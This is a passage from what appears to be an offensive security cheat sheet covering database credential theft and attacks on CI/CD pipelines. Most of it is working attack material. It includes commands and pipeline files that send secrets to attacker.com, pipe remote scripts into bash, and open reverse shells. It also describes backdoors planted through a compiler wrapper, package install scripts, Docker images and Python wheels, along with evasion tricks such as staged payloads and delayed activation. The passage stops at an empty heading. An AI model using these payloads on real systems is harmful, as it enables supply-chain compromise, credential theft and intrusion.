```bash
# PostgreSQL often uses environment variables
env | grep -i pg
cat /proc/<pid>/environ | tr '\0' '\n' | grep -i pg
```

**Hash Cracking:**

```bash
# PostgreSQL MD5 format: md5<hash><username>
hashcat -m 12 hash.txt wordlist.txt
```

### MSSQL (Microsoft SQL Server)

**Windows Authentication Tokens:**

```bash
# Extract from memory (Windows)
mimikatz # sekurlsa::logonpasswords

# Registry keys
reg query "HKLM\SOFTWARE\Microsoft\Microsoft SQL Server" /s
```

**Configuration Files:**

```cmd
type "C:\Program Files\Microsoft SQL Server\MSSQL*\MSSQL\Binn\*.cfg"
findstr /si password *.xml *.ini *.config *.cfg
```

**Credential Extraction via xp_cmdshell (Requires Access):**

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config';
```

**Linked Server Passwords (Stored in Master Database):**

```sql
SELECT * FROM master.sys.servers;
SELECT * FROM sys.linked_logins;
```

### MongoDB

**Configuration File:**

```bash
cat /etc/mongod.conf | grep -A 10 security
```

**Password Extraction (Requires Access):**

```bash
mongo
use admin
db.system.users.find()
db.system.users.find().pretty()
```

**Credential Spray:**

```bash
# Common default credentials
mongo -u admin -p admin
mongo -u root -p root
```

### Oracle Database

**Configuration Files:**

```bash
cat $ORACLE_HOME/network/admin/tnsnames.ora
cat $ORACLE_HOME/network/admin/sqlnet.ora
```

**Password Hash Extraction (Requires DBA Access):**

```sql
SELECT name, password, spare4 FROM sys.user$;
SELECT username, password FROM dba_users;
```

**Hash Cracking:**

```bash
# Oracle 10g
hashcat -m 3100 hash.txt wordlist.txt

# Oracle 11g/12c
hashcat -m 112 hash.txt wordlist.txt
```

### Application Configuration Files

**Common Patterns to Search:**

```bash
# Recursive search for credentials
grep -ri "password" /var/www/ 2>/dev/null
grep -ri "db_pass" /var/www/ 2>/dev/null
grep -ri "connectionstring" /var/www/ 2>/dev/null

# PHP applications
find / -name "config.php" -exec grep -H "password" {} \; 2>/dev/null

# Python applications
find / -name "settings.py" -exec grep -H "PASSWORD" {} \; 2>/dev/null

# Java applications
find / -name "application.properties" -exec grep -H "password" {} \; 2>/dev/null
unzip -p application.jar application.properties | grep password

# .NET applications
find / -name "web.config" -exec grep -H "connectionString" {} \; 2>/dev/null
```

**WordPress:**

```bash
cat /var/www/html/wp-config.php | grep DB_
```

**Drupal:**

```bash
cat /var/www/html/sites/default/settings.php | grep databases
```

**Joomla:**

```bash
cat /var/www/html/configuration.php | grep password
```

### Environment Variables & Processes

**Process Inspection:**

```bash
# View environment of running processes
ps auxe | grep -i password
ps auxe | grep -i db_

# Read process environment directly
cat /proc/<pid>/environ | tr '\0' '\n'
strings /proc/<pid>/cmdline
```

**Docker Environment:**

```bash
docker inspect <container_id> | grep -i password
docker exec <container_id> env | grep -i pass
```

**System-wide Environment:**

```bash
env | grep -i pass
printenv | grep -i db
cat /etc/environment
```

### Network Traffic Analysis

**Capturing Database Authentication:**

```bash
# MySQL (default port 3306)
tcpdump -i any -s 0 -w mysql.pcap port 3306

# PostgreSQL (default port 5432)
tcpdump -i any -s 0 -w postgres.pcap port 5432

# Analyze with Wireshark or tshark
tshark -r mysql.pcap -Y "mysql.query" -T fields -e mysql.query
```

### Tools

**linPEAS/WinPEAS:** Automated enumeration

```bash
./linpeas.sh | grep -i password
./linpeas.sh | grep -i database
```

**LaZagne:** Multi-platform credential extractor

```bash
laZagne.exe all
python laZagne.py all
```

**grep-based Scanner:**

```bash
#!/bin/bash
# Comprehensive credential search
find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.cfg" -o -name "*.ini" -o -name "*.xml" -o -name "*.php" -o -name "*.py" \) -exec grep -l -i "password\|passwd\|pwd\|connectionstring" {} \; 2>/dev/null
```

**SQLMap with --passwords:**

```bash
sqlmap -u "http://<target>/page.php?id=1" --passwords
```

### Post-Extraction Validation

**Credential Testing:**

```bash
# MySQL
mysql -h <target> -u <username> -p<password> -e "SELECT VERSION();"

# PostgreSQL  
psql -h <target> -U <username> -d <database> -c "SELECT version();"

# MSSQL (using impacket)
mssqlclient.py <username>:<password>@<target> -windows-auth

# MongoDB
mongo <target>/<database> -u <username> -p <password>
```

---

## Important Related Topics

For comprehensive database exploitation knowledge, consider studying these interconnected areas:

- **SQL Injection** (SQLi fundamentals, blind SQLi, time-based exploitation, out-of-band techniques)
- **NoSQL Injection** (MongoDB, CouchDB, Cassandra operator injection)
- **LDAP Injection** (Directory service exploitation)
- **Authentication Bypass Techniques** (Default credentials, weak hashing, session manipulation)
- **Privilege Escalation via Database Access** (UDF exploitation, stored procedures, file system access)

---

# CI/CD Pipeline Security

## Pipeline Enumeration

Pipeline enumeration is the initial reconnaissance phase where you identify and map CI/CD infrastructure, exposed endpoints, and configuration details.

### Common CI/CD Platforms

- **Jenkins** - Web UI typically on ports 8080/8443
- **GitLab CI/CD** - Integrated with GitLab repositories
- **GitHub Actions** - Workflow files in `.github/workflows/`
- **CircleCI** - Configuration in `.circleci/config.yml`
- **Travis CI** - Configuration in `.travis.yml`
- **Azure DevOps** - Microsoft's integrated platform
- **TeamCity** - JetBrains CI server
- **Bamboo** - Atlassian's CI/CD tool
- **Drone CI** - Container-native CI/CD

### Enumeration Techniques

**Web Interface Discovery**

```bash
# Nmap service detection
nmap -sV -p 8080,8443,9000 <target>

# Check for common CI/CD paths
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<target>/FUZZ

# Common endpoints to check
curl http://<target>:8080/
curl http://<target>:8080/login
curl http://<target>:8080/api/
curl http://<target>:8080/console
```

**Jenkins-Specific Enumeration**

```bash
# Check Jenkins version (often exposed)
curl http://<target>:8080/api/json

# Enumerate jobs without authentication
curl http://<target>:8080/api/json?tree=jobs[name,url]

# Check for script console (if accessible)
curl http://<target>:8080/script

# Check for CLI access
curl http://<target>:8080/cli

# Enumerate users
curl http://<target>:8080/asynchPeople/api/json
```

**GitLab CI/CD Enumeration**

```bash
# Check GitLab version
curl https://<target>/api/v4/version

# Enumerate public projects
curl https://<target>/api/v4/projects?visibility=public

# Check pipeline configurations (requires auth)
curl --header "PRIVATE-TOKEN: <token>" \
  https://<target>/api/v4/projects/<id>/pipelines

# Enumerate runners
curl --header "PRIVATE-TOKEN: <token>" \
  https://<target>/api/v4/runners/all
```

**GitHub Actions Enumeration**

```bash
# Check for workflow files in repositories
git clone <repo>
find . -path "*/.github/workflows/*.yml"

# List workflow runs (requires GitHub CLI or API)
gh api repos/<owner>/<repo>/actions/runs

# Check for self-hosted runners (look for specific labels)
gh api repos/<owner>/<repo>/actions/runners
```

**Configuration File Discovery**

```bash
# Search for CI/CD configs in repositories
find . -name ".gitlab-ci.yml"
find . -name ".travis.yml"
find . -name "Jenkinsfile"
find . -name "azure-pipelines.yml"
find . -path "*/.github/workflows/*.yml"
find . -name ".circleci/config.yml"

# Search for pipeline configs in web directories
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt \
  -x yml,yaml,json,xml
```

**API Enumeration**

```bash
# Generic API discovery
curl http://<target>/api/v1/
curl http://<target>/api/v2/

# Check for GraphQL endpoints (common in modern CI/CD)
curl -X POST http://<target>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

**Container Registry Enumeration**

```bash
# Check for Docker registry
curl http://<target>:5000/v2/_catalog

# Enumerate tags for an image
curl http://<target>:5000/v2/<image>/tags/list

# GitLab Container Registry
curl --header "PRIVATE-TOKEN: <token>" \
  https://<target>/api/v4/projects/<id>/registry/repositories
```

### Information Leakage Points

**Build Logs**

- Often contain secrets, tokens, environment variables
- May reveal internal network structure
- Can expose deployment processes

**Job Configurations**

- Hardcoded credentials
- API keys in environment variables
- Internal hostnames and IP addresses

**Plugin/Extension Information**

```bash
# Jenkins plugin enumeration
curl http://<target>:8080/pluginManager/api/json?depth=1
```

### Network-Level Enumeration

```bash
# Check for build agents/runners
nmap -sn <target-network>/24

# Identify CI/CD traffic patterns
tcpdump -i eth0 'port 8080 or port 9000' -w ci_traffic.pcap

# Check for SSH keys used by CI/CD (if you have access)
grep -r "BEGIN.*PRIVATE KEY" /var/lib/jenkins/
```

---

## Secret Extraction

Secret extraction involves identifying and exfiltrating sensitive credentials, tokens, and keys from CI/CD pipelines.

### Common Secret Locations

**Environment Variables**

- Pipeline configuration files
- Build logs (stdout/stderr)
- Container environment
- Runner/agent configurations

**Configuration Files**

```bash
# Jenkins credentials
/var/lib/jenkins/credentials.xml
/var/lib/jenkins/secrets/
/var/lib/jenkins/users/

# GitLab secrets
/etc/gitlab/gitlab-secrets.json
/var/opt/gitlab/gitlab-rails/shared/encrypted_settings/

# GitHub Actions secrets (encrypted, requires access)
Repository Settings > Secrets > Actions
```

**Source Code & Version Control**

```bash
# Search for secrets in Git history
trufflehog git https://github.com/<repo>.git

# GitLeaks for secret scanning
gitleaks detect --source . --verbose

# Search for common patterns
git grep -i "password"
git grep -i "api_key"
git grep -E "AKIA[0-9A-Z]{16}" # AWS Access Key pattern
```

### Jenkins Secret Extraction

**Accessing Credentials via Script Console** If you have access to Jenkins Script Console (`/script`):

```groovy
// List all credentials
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardCredentials.class,
    Jenkins.instance,
    null,
    null
)

for (c in creds) {
    println(c.id + ": " + c.description)
}

// Extract username/password credentials
import com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl

def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    UsernamePasswordCredentialsImpl.class,
    Jenkins.instance,
    null,
    null
)

for (c in creds) {
    println("ID: " + c.id)
    println("Username: " + c.username)
    println("Password: " + c.password)
    println("---")
}

// Extract SSH keys
import com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey

def sshCreds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    BasicSSHUserPrivateKey.class,
    Jenkins.instance,
    null,
    null
)

for (c in sshCreds) {
    println("ID: " + c.id)
    println("Username: " + c.username)
    println("Private Key: " + c.privateKey)
    println("---")
}

// Extract secret text
import org.jenkinsci.plugins.plaincredentials.impl.StringCredentialsImpl

def secretCreds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    StringCredentialsImpl.class,
    Jenkins.instance,
    null,
    null
)

for (c in secretCreds) {
    println("ID: " + c.id)
    println("Secret: " + c.secret)
    println("---")
}
```

**Decrypting Jenkins Secrets (Offline)**

```bash
# Jenkins uses master.key and hudson.util.Secret for encryption
# Location: /var/lib/jenkins/secrets/

# Extract encrypted credentials from credentials.xml
grep -A 5 "password" /var/lib/jenkins/credentials.xml

# Decrypt using jenkins-decrypt tool
# [Inference] Requires master.key and hudson.util.Secret files
python jenkins-decrypt.py <encrypted_password>
```

**Build Log Extraction**

```bash
# Access build logs via API
curl http://<target>:8080/job/<jobname>/<build-number>/consoleText

# Download all logs for a job
for i in {1..100}; do
    curl http://<target>:8080/job/<jobname>/$i/consoleText > build_$i.log
done

# Search logs for secrets
grep -rE "password|token|api.key|secret" *.log
grep -rE "AKIA[0-9A-Z]{16}" *.log # AWS keys
grep -rE "ghp_[a-zA-Z0-9]{36}" *.log # GitHub tokens
```

### GitLab Secret Extraction

**CI/CD Variables via API**

```bash
# List project variables (requires maintainer+ access)
curl --header "PRIVATE-TOKEN: <token>" \
  https://<target>/api/v4/projects/<id>/variables

# Get specific variable
curl --header "PRIVATE-TOKEN: <token>" \
  https://<target>/api/v4/projects/<id>/variables/<key>

# Group-level variables
curl --header "PRIVATE-TOKEN: <token>" \
  https://<target>/api/v4/groups/<id>/variables
```

**Pipeline Secrets Exposure**

```yaml
# Inject into .gitlab-ci.yml to exfiltrate secrets
test_secrets:
  script:
    - env | grep -v "CI_JOB_TOKEN" > secrets.txt
    - curl -X POST -d @secrets.txt https://attacker.com/collect
```

**Runner Token Extraction**

```bash
# If you have filesystem access to a runner
cat /etc/gitlab-runner/config.toml | grep token

# Use token to register malicious runner
gitlab-runner register \
  --url https://<target> \
  --registration-token <token>
```

### GitHub Actions Secret Extraction

**Workflow Manipulation**

```yaml
# Modify workflow to echo secrets (careful: GitHub masks some patterns)
name: Extract Secrets
on: push
jobs:
  exfiltrate:
    runs-on: ubuntu-latest
    steps:
      - name: Echo secrets
        run: |
          echo "${{ secrets.SECRET_NAME }}" | base64
      - name: Exfiltrate
        run: |
          curl -X POST -d "secret=${{ secrets.SECRET_NAME }}" https://attacker.com
```

**GITHUB_TOKEN Abuse**

```bash
# The GITHUB_TOKEN has repo scope by default
# Use it to access private repository data
curl -H "Authorization: token $GITHUB_TOKEN" \
  https://api.github.com/repos/<owner>/<repo>/contents/<path>
```

**Self-Hosted Runner Compromise**

```bash
# If runner is compromised, extract environment
env > /tmp/env_dump.txt

# Check for mounted secrets
ls -la /mnt/secrets/
ls -la /run/secrets/

# Pivot to runner's network
ip addr
ip route
```

### CircleCI Secret Extraction

**Context Variables**

```bash
# Contexts are shared across projects
# Access via API (requires personal API token)
curl -H "Circle-Token: <token>" \
  https://circleci.com/api/v2/context/<context-id>/environment-variable
```

**Project Environment Variables**

```bash
# List project env vars
curl -H "Circle-Token: <token>" \
  https://circleci.com/api/v2/project/<vcs>/<org>/<repo>/envvar
```

### Container & Artifact Registries

**Docker Registry Secrets**

```bash
# Pull image and extract secrets
docker pull <registry>/<image>:<tag>
docker save <image> -o image.tar
tar -xvf image.tar

# Search for secrets in layers
grep -r "password" .
grep -r "api_key" .

# Check for Docker config files
cat */layer/root/.docker/config.json
```

**Kubernetes Secrets (if pipeline deploys to K8s)**

```bash
# If you gain access to pipeline's kubeconfig
kubectl get secrets --all-namespaces

# Decode secrets
kubectl get secret <name> -o jsonpath='{.data.password}' | base64 -d
```

### Environment Variable Extraction Techniques

**Command Injection in Pipeline**

```bash
# If you can inject commands into build steps
env | curl -X POST -d @- https://attacker.com/collect

# Alternative exfiltration
env | base64 | curl -X POST -d @- https://attacker.com/collect
```

**Log Poisoning**

```bash
# Force secrets into logs (if you can modify pipeline)
echo "SECRET_VALUE: $SECRET_VAR"
printenv | grep SECRET
```

### Automated Secret Scanning Tools

**TruffleHog**

```bash
# Scan Git repository
trufflehog git https://github.com/<repo> --only-verified

# Scan filesystem
trufflehog filesystem /path/to/jenkins

# JSON output for parsing
trufflehog git https://github.com/<repo> --json > secrets.json
```

**GitLeaks**

```bash
# Scan current directory
gitleaks detect --source . --verbose

# Scan specific commit range
gitleaks detect --source . --log-opts="HEAD~10..HEAD"

# Custom rules
gitleaks detect --config gitleaks.toml
```

**Detect-Secrets**

```bash
# Scan for secrets
detect-secrets scan > .secrets.baseline

# Audit findings
detect-secrets audit .secrets.baseline
```

**GitGuardian (ggshield)**

```bash
# Scan repository
ggshield scan repo <path>

# Scan CI environment
ggshield scan ci
```

### Cloud Provider Credentials

**AWS Credentials**

```bash
# Check for AWS credentials in common locations
cat ~/.aws/credentials
cat /home/jenkins/.aws/credentials

# Environment variables
echo $AWS_ACCESS_KEY_ID
echo $AWS_SECRET_ACCESS_KEY

# Instance metadata (if pipeline runs on EC2)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**GCP Credentials**

```bash
# Service account keys
find / -name "*gcp*.json" 2>/dev/null
find / -name "*serviceaccount*.json" 2>/dev/null

# Application default credentials
cat ~/.config/gcloud/application_default_credentials.json
```

**Azure Credentials**

```bash
# Azure CLI credentials
cat ~/.azure/clouds.config
cat ~/.azure/azureProfile.json

# Managed identity endpoint (if on Azure VM)
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true"
```

---

## Build Artifact Manipulation

Build artifact manipulation involves modifying compiled outputs, packages, or deployable assets to inject malicious code or backdoors.

### Understanding Build Artifacts

**Common Artifact Types**

- Compiled binaries (ELF, PE, Mach-O)
- Container images (Docker, OCI)
- Package files (JAR, WAR, NPM, PyPI, DEB, RPM)
- Deployment archives (ZIP, TAR)
- Infrastructure templates (Terraform, CloudFormation)

**Artifact Storage Locations**

- Artifact repositories (Nexus, Artifactory, Azure Artifacts)
- Container registries (Docker Hub, ECR, GCR, ACR)
- Cloud storage (S3, GCS, Azure Blob)
- CI/CD workspace directories
- Version control release assets

### Attack Vectors

**Pipeline Stage Injection** Modify build steps to alter artifacts before packaging:

```yaml
# GitLab CI example - inject malicious step
stages:
  - build
  - malicious
  - deploy

build_job:
  stage: build
  script:
    - make build

malicious_job:
  stage: malicious
  script:
    - echo "Injecting backdoor..."
    - echo "malicious_code()" >> dist/app.py
  artifacts:
    paths:
      - dist/

deploy_job:
  stage: deploy
  script:
    - ./deploy.sh
```

**Dependency Confusion/Substitution**

```bash
# Upload malicious package with same name to public repository
# [Inference] If pipeline prioritizes public repos over private, it will pull malicious package

# NPM example
npm publish malicious-internal-package

# PyPI example
python setup.py sdist upload -r pypi
```

**Direct Artifact Replacement**

```bash
# If you have write access to artifact storage
aws s3 cp malicious-app.jar s3://artifacts-bucket/app.jar

# Docker registry manipulation
docker tag malicious-image:latest registry.company.com/app:latest
docker push registry.company.com/app:latest
```

### Container Image Manipulation

**Layer Injection**

```bash
# Pull original image
docker pull target-registry.com/app:1.0

# Create malicious layer
cat > Dockerfile <<EOF
FROM target-registry.com/app:1.0
RUN curl https://attacker.com/backdoor.sh | bash
CMD ["/backdoor.sh"]
EOF

# Build and push
docker build -t target-registry.com/app:1.0 .
docker push target-registry.com/app:1.0
```

**Image Tag Manipulation**

```bash
# Retag malicious image with production tag
docker tag malicious-image:latest production-registry/app:stable
docker push production-registry/app:stable

# If registry has weak auth, directly modify manifest
curl -X PUT https://registry.com/v2/app/manifests/stable \
  -H "Content-Type: application/vnd.docker.distribution.manifest.v2+json" \
  -d @malicious_manifest.json
```

**Registry Poisoning via API**

```bash
# GitLab Container Registry example
# Delete legitimate image
curl --request DELETE --header "PRIVATE-TOKEN: <token>" \
  "https://gitlab.com/api/v4/projects/<id>/registry/repositories/<repo_id>"

# [Inference] Then push malicious image with same tag
docker push gitlab.com/<group>/<project>/<image>:<tag>
```

### Binary Modification

**ELF Binary Patching (Linux)**

```bash
# Add malicious section
objcopy --add-section .malicious=payload.bin original_binary modified_binary

# Patch entry point
# [Inference] Requires binary analysis to find safe injection point
patchelf --set-rpath /malicious/path binary
```

**PE Binary Patching (Windows)**

```bash
# Using PE manipulation tools
# [Unverified] Specific tools vary, but common approach:
# Add new section with malicious code
# Modify entry point to execute injected code first
# Return to original entry point to maintain functionality
```

**JAR/WAR Manipulation (Java)**

```bash
# Extract JAR
unzip original.jar -d extracted/

# Add malicious class
javac Backdoor.java
cp Backdoor.class extracted/com/company/

# Modify manifest to execute backdoor
cat >> extracted/META-INF/MANIFEST.MF <<EOF
Main-Class: com.company.Backdoor
EOF

# Repackage
cd extracted
jar cvfm ../malicious.jar META-INF/MANIFEST.MF *
```

**Python Package Manipulation**

```bash
# Extract wheel
unzip original.whl -d extracted/

# Add malicious code to __init__.py
cat >> extracted/package/__init__.py <<EOF
import os
os.system('curl https://attacker.com/shell.sh | bash')
EOF

# Repackage
cd extracted
zip -r ../malicious.whl *
```

### Build Process Hijacking

**Makefile Injection**

```makefile
# Add malicious target that runs during build
.PHONY: build
build: inject_backdoor compile

inject_backdoor:
	@echo "Injecting payload..."
	@echo 'exec(open("/tmp/backdoor.py").read())' >> src/main.py
	@curl -s https://attacker.com/backdoor.py -o /tmp/backdoor.py

compile:
	@python setup.py build
```

**Build Script Modification**

```bash
# Modify build.sh
cat >> build.sh <<'EOF'
# Inject backdoor before compilation
wget https://attacker.com/payload -O /tmp/payload
cat /tmp/payload >> src/app.c
make
EOF
```

**Compiler/Build Tool Compromise**

```bash
# If you can modify the build environment
# Replace compiler with wrapper that injects code
mv /usr/bin/gcc /usr/bin/gcc.real

cat > /usr/bin/gcc <<'EOF'
#!/bin/bash
# Inject malicious code into every compilation
echo 'void backdoor() { system("/bin/bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\""); }' > /tmp/inject.c
/usr/bin/gcc.real /tmp/inject.c "$@"
EOF

chmod +x /usr/bin/gcc
```

### Artifact Repository Compromise

**Nexus Repository Manipulation**

```bash
# Upload malicious artifact (requires auth)
curl -u admin:password --upload-file malicious.jar \
  http://nexus.company.com/repository/releases/com/company/app/1.0/app-1.0.jar

# [Inference] If successful, all builds pulling this version get malicious artifact
```

**Artifactory Manipulation**

```bash
# Upload via REST API
curl -u user:password -T malicious.war \
  "http://artifactory.company.com/artifactory/libs-release-local/com/company/app/1.0/app-1.0.war"

# Set properties to make it look legitimate
curl -u user:password -X PUT \
  "http://artifactory.company.com/artifactory/api/storage/libs-release-local/com/company/app/1.0/app-1.0.war?properties=build.name=official-build;build.number=42"
```

### Supply Chain Injection Points

**Pre-Build Stage**

- Source code manipulation (if repo access)
- Dependency resolution (malicious dependencies)
- Submodule poisoning (Git submodules)

**Build Stage**

- Compiler/interpreter compromise
- Build script modification
- Environment variable manipulation

**Post-Build Stage**

- Artifact signing bypass
- Checksum manipulation
- Repository upload tampering

**Deployment Stage**

- Deployment script modification
- Configuration file injection
- Infrastructure template tampering

### Verification Bypass Techniques

**Checksum Manipulation**

```bash
# Replace artifact and update checksum file
cp malicious.jar original.jar
sha256sum original.jar > original.jar.sha256

# If pipeline only checks checksum file existence, not validity against known good
```

**Signature Bypass**

```bash
# If signing key is accessible in pipeline
# [Inference] Sign malicious artifact with legitimate key
gpg --local-user build@company.com --armor --detach-sign malicious.jar

# Replace both artifact and signature
```

**Timestamp Manipulation**

```bash
# Make malicious artifact appear to be from legitimate build time
touch -t 202401151430.00 malicious.jar

# [Inference] Some verification systems rely on timestamps
```

### Persistence via Artifacts

**Embed Persistence in Docker Images**

```dockerfile
FROM original-image:latest

# Add persistence mechanism
RUN echo '#!/bin/bash' > /etc/cron.daily/backdoor && \
    echo 'curl https://attacker.com/shell.sh | bash' >> /etc/cron.daily/backdoor && \
    chmod +x /etc/cron.daily/backdoor

# Maintain original functionality
CMD ["original-entrypoint"]
```

**Package Post-Install Scripts**

```bash
# Debian package example
# Modify postinst script
cat > DEBIAN/postinst <<'EOF'
#!/bin/bash
set -e

# Legitimate post-install
systemctl enable myapp

# Malicious addition
(crontab -l 2>/dev/null; echo "*/5 * * * * curl https://attacker.com/beacon") | crontab -

exit 0
EOF

chmod 755 DEBIAN/postinst
dpkg-deb --build package/
```

### Detection Avoidance

**Staged Payload Delivery**

```python
# Don't include full payload in artifact
# Download it later during runtime
import requests
import base64

def init():
    # Looks like telemetry
    response = requests.get('https://cdn.company.com/config/telemetry.json')
    # Actually contains base64-encoded payload
    payload = base64.b64decode(response.json()['endpoint'])
    exec(payload)
```

**Conditional Execution**

```python
# Only execute malicious code in production environment
import os

if os.getenv('ENVIRONMENT') == 'production':
    # Malicious code here
    pass
```

**Time-Delayed Activation**

```python
import datetime

# Activate after deployment has passed security review
activation_date = datetime.datetime(2025, 11, 1)
if datetime.datetime.now() > activation_date:
    # Malicious code
    pass
```

---

## Webhook Exploitation

Webhook exploitation involves abusing HTTP callbacks to trigger unauthorized pipeline executions, inject malicious payloads, or pivot into internal networks.

### Webhook Fundamentals

**Common Webhook Implementations**

- Git repository webhooks (push, pull request, merge)
- Issue tracker webhooks (Jira, GitHub Issues)
- Chat platform webhooks (Slack, Discord, MS Teams)
- Monitoring/alerting webhooks (Prometheus, Grafana)
- CI/CD trigger webhooks

**Webhook Security Issues**

- Lack of authentication/verification
- Insufficient input validation
- SSRF vulnerabilities
- Command injection via webhook parameters
- Replay attacks

### Webhook Discovery

**Enumerate Webhook Endpoints**

```bash
# Check repository settings via API
# GitHub
curl -H "Authorization: token <token>" \
  https://api.github.com/repos/<owner>/<repo>/hooks

# GitLab
curl --header "PRIVATE-TOKEN: <token>" \
  https://gitlab.com/api/v4/projects/<id>/hooks

# Common webhook paths
/webhook
/hooks
/github-webhook
/gitlab-webhook
/bitbucket-webhook
/api/webhook
/ci/webhook
```

**Webhook Configuration Files**

```bash
# Look for webhook configs in repositories
grep -r "webhook" .
grep -r "hook_url" .
find . -name "*webhook*.yml"
find . -name "*webhook*.json"
```

### Webhook Trigger Manipulation

**Unauthenticated Webhook Triggers**

```bash
# If webhook has no authentication
curl -X POST http://ci-server.com/webhook/build \
  -H "Content-Type: application/json" \
  -d '{"repository": "target-repo", "branch": "main"}'

# Trigger multiple builds to cause DoS
for i in {1..100}; do
    curl -X POST http://ci-server.com/webhook/build &
done
```

**Webhook Signature Bypass**

```bash
# GitHub uses HMAC-SHA256 signature
# If secret is weak or exposed, forge signature

import hmac
import hashlib

secret = b"weak_secret"
payload = b'{"ref":"refs/heads/main"}'
signature = "sha256=" + hmac.new(secret, payload, hashlib.sha256).hexdigest()

# Send forged webhook
curl -X POST http://ci-server.com/github-webhook \
  -H "X-Hub-Signature-256: ${signature}" \
  -H "Content-Type: application/json" \
  -d "${payload}"
```

**GitLab Token Brute Force**

```bash
# GitLab webhooks use secret tokens
# If weak token, brute force possible

for token in $(cat wordlist.txt); do
    response=$(curl -s -X POST http://ci-server.com/gitlab-webhook \
      -H "X-Gitlab-Token: $token" \
      -H "Content-Type: application/json" \
      -d '{"ref":"main"}' \
      -w "%{http_code}")
    
    if [[ "$response" == *"200"* ]]; then
        echo "Valid token: $token"
        break
    fi
done
```

### Payload Injection via Webhooks

**Command Injection in Webhook Parameters**

```bash
# If webhook data is used in shell commands without sanitization
curl -X POST http://ci-server.com/webhook \
  -H "Content-Type: application/json" \
  -d '{
    "branch": "main; curl https://attacker.com/shell.sh | bash #",
    "repository": "target"
  }'

# Alternative payloads
"branch": "main$(whoami)"
"branch": "main`curl https://attacker.com`"
"branch": "main || wget https://attacker.com/backdoor"
```

**Code Injection via Branch Names**

```bash
# Create branch with malicious name that gets executed
git checkout -b '$(curl https://attacker.com/payload.sh | bash)'
git push origin '$(curl https://attacker.com/payload.sh | bash)'

# If pipeline uses branch name unsafely:
# git checkout ${BRANCH_NAME}  # Vulnerable
```

**Commit Message Injection**

```bash
# Malicious commit message that gets processed
git commit -m "Update feature; curl https://attacker.com | sh"
git push

# If CI/CD parses commit messages for commands or includes them in scripts
```

**Pull Request/Merge Request Poisoning**

```json
// Create PR with malicious title/description
{
  "title": "Fix bug $(nc attacker.com 4444 -e /bin/bash)",
  "description": "Updates dependencies\n\n```\ncurl https://attacker.com/shell.sh | bash\n```",
  "source_branch": "malicious",
  "target_branch": "main"
}
```

### SSRF via Webhooks

**Internal Network Scanning**

```bash
# Configure webhook URL to point to internal hosts
# Observe response times/errors to enumerate internal network

# GitHub webhook configuration
curl -X POST -H "Authorization: token <token>" \
  https://api.github.com/repos/<owner>/<repo>/hooks \
  -d '{
    "name": "web",
    "config": {
      "url": "http://192.168.1.1:80",
      "content_type": "json"
    },
    "events": ["push"]
  }'

# Trigger and observe
git commit --allow-empty -m "SSRF scan"
git push
```

**Cloud Metadata Access**

```bash
# Point webhook to cloud metadata service
# AWS
"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# GCP
"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Azure
"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

**Internal Service Exploitation**

```bash
# Target internal services
"url": "http://internal-jenkins:8080/script"
"url": "http://internal-db:5432/"
"url": "http://internal-api:3000/admin"

# [Inference] Some CI/CD systems may follow redirects, enabling more complex SSRF chains
```

### Webhook Race Conditions

**Parallel Webhook Processing**

```bash
# Send multiple webhooks simultaneously to cause race conditions
for i in {1..10}; do
    curl -X POST http://ci-server.com/webhook \
      -H "Content-Type: application/json" \
      -d '{"ref":"main","action":"build"}' &
done

# [Inference] May cause:
# - Multiple simultaneous builds modifying same artifacts
# - Resource exhaustion

# - Inconsistent state in pipeline execution

# - Artifact corruption from concurrent writes
````

**Time-of-Check to Time-of-Use (TOCTOU)**
```bash
# Exploit timing window between webhook validation and execution

# 1. Send legitimate webhook to pass validation
curl -X POST http://ci-server.com/webhook \
  -H "Content-Type: application/json" \
  -d '{"ref":"refs/heads/main","repository":"legitimate-repo"}'

# 2. Immediately modify repository content before pipeline executes
git push origin malicious-branch:main --force

# [Inference] If validation happens before checkout, malicious code may execute
````

### Webhook Replay Attacks

**Capture and Replay Webhooks**

```bash
# If webhook signatures don't include timestamps or nonces
# Capture legitimate webhook (via MitM, logs, or compromise)

# Replay captured webhook
curl -X POST http://ci-server.com/webhook \
  -H "X-Hub-Signature-256: sha256=abc123..." \
  -H "X-GitHub-Event: push" \
  -H "Content-Type: application/json" \
  -d @captured_webhook.json

# Replay multiple times to trigger unwanted builds
```

**Timestamp Manipulation**

```bash
# If timestamp validation is weak or absent
# Modify timestamp in replayed webhook

import json
import time

webhook = json.load(open('captured.json'))
webhook['timestamp'] = int(time.time())

# Replay with updated timestamp
```

### Webhook Chaining

**Cross-Service Webhook Chains**

```bash
# Use one service's webhook to trigger another

# 1. Compromise Slack webhook
curl -X POST https://hooks.slack.com/services/T00/B00/XXX \
  -H "Content-Type: application/json" \
  -d '{"text":"Build started"}'

# 2. If CI/CD monitors Slack and triggers on keywords
# Inject commands via Slack message
curl -X POST https://hooks.slack.com/services/T00/B00/XXX \
  -H "Content-Type: application/json" \
  -d '{"text":"deploy production; curl attacker.com/shell.sh | bash"}'
```

**Webhook Forwarding for Pivoting**

```bash
# Set up webhook forwarding to reach internal networks

# On compromised external server
nc -lvp 8080 -c "nc internal-ci-server.local 80"

# Configure webhook to hit compromised server
"url": "http://compromised-server.com:8080/webhook"

# [Inference] Requests forward to internal CI/CD system
```

### Platform-Specific Exploitation

